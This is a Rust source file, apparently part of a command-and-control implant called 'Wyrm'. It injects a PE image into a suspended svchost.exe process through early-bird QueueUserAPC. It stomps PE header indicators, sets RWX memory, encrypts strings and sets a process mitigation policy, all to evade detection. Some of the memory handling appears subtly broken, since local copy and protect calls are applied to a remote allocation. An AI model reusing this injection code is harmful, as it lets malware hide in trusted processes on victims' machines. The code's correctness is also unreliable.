use std::{
    ffi::c_void,
    mem::transmute,
    ptr::{copy_nonoverlapping, null_mut, read_unaligned},
};

use shared::tasks::WyrmResult;
use str_crypter::{decrypt_string, sc};
use windows_sys::{
    Win32::{
        Foundation::{CloseHandle, FALSE, GetLastError},
        System::{
            Diagnostics::Debug::IMAGE_NT_HEADERS64,
            Memory::{
                GetProcessHeap, HEAP_ZERO_MEMORY, HeapAlloc, MEM_COMMIT, MEM_RESERVE,
                PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx, VirtualProtect,
            },
            SystemServices::IMAGE_DOS_HEADER,
            Threading::{
                CREATE_SUSPENDED, CreateProcessA, DeleteProcThreadAttributeList,
                EXTENDED_STARTUPINFO_PRESENT, InitializeProcThreadAttributeList,
                PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PROCESS_INFORMATION, QueueUserAPC,
                ResumeThread, STARTUPINFOEXA, STARTUPINFOW_FLAGS, UpdateProcThreadAttribute,
            },
        },
    },
    core::PSTR,
};

use crate::utils::{export_resolver::find_export_address, pe_stomp::stomp_pe_header_bytes};

const SPAWN_AS_IMAGE: &str = r"C:\Windows\System32\svchost.exe";

pub(super) fn spawn_sibling(mut buf: Vec<u8>) -> WyrmResult<String> {
    //
    // Create the process in a suspended state, using the image specified by either the user (TODO) or
    // svchost as the default image.
    //
    let mut pi = PROCESS_INFORMATION::default();
    let mut si = STARTUPINFOEXA::default();
    si.StartupInfo.cb = size_of::<STARTUPINFOEXA>() as _;
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    let mut attr_size: usize = 0;

    let _ = unsafe { InitializeProcThreadAttributeList(null_mut(), 1, 0, &mut attr_size) };

    let attr_list = unsafe { HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attr_size) };

    let _ = unsafe { InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size) };
    let policy = 0x00000001u64 << 44;

    let _ = unsafe {
        UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
            &policy as *const _ as *const c_void,
            std::mem::size_of::<u64>(),
            null_mut(),
            null_mut(),
        )
    };
    si.lpAttributeList = attr_list;

    let image_path = PSTR::from(SPAWN_AS_IMAGE.as_ptr() as _);
    let result_create_process = unsafe {
        CreateProcessA(
            null_mut(),
            image_path,
            null_mut(),
            null_mut(),
            FALSE,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &si.StartupInfo,
            &mut pi,
        )
    };

    // Check if we were successful..
    if result_create_process == 0 {
        let msg = format!(
            "{} {:#X}",
            sc!("Failed to create process. Error code:", 71).unwrap(),
            unsafe { GetLastError() }
        );

        #[cfg(debug_assertions)]
        {
            use shared::pretty_print::print_failed;

            print_failed(&msg);
        }

        return WyrmResult::Err::<String>(msg);
    }

    unsafe { DeleteProcThreadAttributeList(attr_list) };

    //
    // Allocate the memory + copy our process image in (stomping some indicators in the process of)
    //

    let p_alloc = match write_image_rw(pi.hProcess, &mut buf) {
        Ok(p) => p,
        Err(e) => {
            let msg = format!(
                "{} {e:#X}",
                sc!("Failed to write process memory:", 71).unwrap()
            );

            #[cfg(debug_assertions)]
            {
                use shared::pretty_print::print_failed;

                print_failed(&msg);
            }

            unsafe { CloseHandle(pi.hThread) };
            unsafe { CloseHandle(pi.hProcess) };

            return WyrmResult::Err::<String>(msg);
        }
    };

    //
    // Now the image is loaded in memory; we are either looking for the address of entrypoint of the PE,
    // or the reflective loader export "Load".
    //

    let p_start = find_start_address(&buf, p_alloc as _);

    // Mark memory RWX

    let mut old_protect = 0;
    let _ = unsafe { VirtualProtect(p_alloc, buf.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) };

    let result_queue_apc = match p_start {
        StartAddress::Load(addr) => {
            // With this variant we need to include an argument to the starting thread which is the base
            // address of the allocation for the reflective loader to do its business
            let p_thread_start: unsafe extern "system" fn(usize) = unsafe { transmute(addr) };
            unsafe { QueueUserAPC(Some(p_thread_start), pi.hThread, p_alloc as usize) }
        }
        StartAddress::AddressOfEntryPoint(addr) => {
            let p_thread_start: unsafe extern "system" fn(usize) = unsafe { transmute(addr) };
            unsafe { QueueUserAPC(Some(p_thread_start), pi.hThread, 0) }
        }
    };

    // Error check
    if result_queue_apc == 0 {
        let msg = format!(
            "{} {:#X}",
            sc!("Failed to run QueueUserApc:", 71).unwrap(),
            unsafe { GetLastError() }
        );

        #[cfg(debug_assertions)]
        {
            use shared::pretty_print::print_failed;

            print_failed(&msg);
        }

        unsafe { CloseHandle(pi.hThread) };
        unsafe { CloseHandle(pi.hProcess) };

        return WyrmResult::Err::<String>(msg);
    }

    // TODO better opsec option?
    unsafe { ResumeThread(pi.hThread) };

    unsafe { CloseHandle(pi.hThread) };
    unsafe { CloseHandle(pi.hProcess) };
    WyrmResult::Ok(sc!("Process created.", 19).unwrap())
}

enum StartAddress {
    Load(*const c_void),
    AddressOfEntryPoint(*const c_void),
}

/// Finds the start address of the loaded image to use reflectively. The start address returned is the starting address from
/// the **INPUT BUFFER** which does not account for the offset of the memory allocation. You must calculate
/// that yourself.
///
/// # Args
/// `buf`: The user specified buffer containing an image to search through
/// `base_original_allocation`: A pointer to the actual memory allocation which is used to compute the actual start address
///   accounting for allocation size etc.
fn find_start_address(buf: &Vec<u8>, base_original_allocation: *const u8) -> StartAddress {
    //
    // The strategy here will be first to search for the "Load" export. If the image does not have this export, the fallback
    // option will be to return the AddressOfEntrypoint.
    //
    // This should allow the Wyrm loader (no Load function), the raw Wyrm payload, and custom loaders to run.
    // TODO write some docs for this requirement.
    //

    let p_base = buf.as_ptr();
    let dos = unsafe { read_unaligned(p_base as *const IMAGE_DOS_HEADER) };
    let mapped_nt_ptr = (p_base as usize + dos.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    match find_export_address(p_base as _, mapped_nt_ptr, "Load") {
        Some(p) => {
            let addr = calculate_memory_delta(p_base as usize, p as usize);
            let addr_calculated = unsafe { base_original_allocation.add(addr) };
            StartAddress::Load(addr_calculated as _)
        }
        None => {
            // Use AddressOfEntrypoint instead
            let address_entry_rva = unsafe { *mapped_nt_ptr }.OptionalHeader.AddressOfEntryPoint;
            let p_fn_start = unsafe { p_base.add(address_entry_rva as usize) };
            let addr = calculate_memory_delta(p_base as _, p_fn_start as _);
            let addr_calculated = unsafe { base_original_allocation.add(addr) };
            StartAddress::AddressOfEntryPoint(addr_calculated as _)
        }
    }
}

fn calculate_memory_delta(buf_start_address: usize, fn_ptr_address: usize) -> usize {
    fn_ptr_address.saturating_sub(buf_start_address)
}

/// Allocates and writes memory pages in a remote process with `PAGE_READWRITE` protection
/// with the content of some user specified buffer.
///
/// # Returns
/// If successful will return the address of the allocation; if it fails, will return the error
/// produced from calling `GetLastError`
fn write_image_rw(h_process: *const c_void, buf: &mut Vec<u8>) -> Result<*const c_void, u32> {
    let p_alloc = unsafe {
        VirtualAllocEx(
            h_process as _,
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if p_alloc.is_null() {
        return Err(unsafe { GetLastError() });
    }

    //
    // Before copying the memory we will stomp some indicators that we are injecting a PE
    // such as the MZ and "This program.."
    //
    stomp_pe_header_bytes(buf);

    //
    // Now write the memory
    //

    unsafe { copy_nonoverlapping(buf.as_ptr(), p_alloc as _, buf.len()) };

    Ok(p_alloc)
}
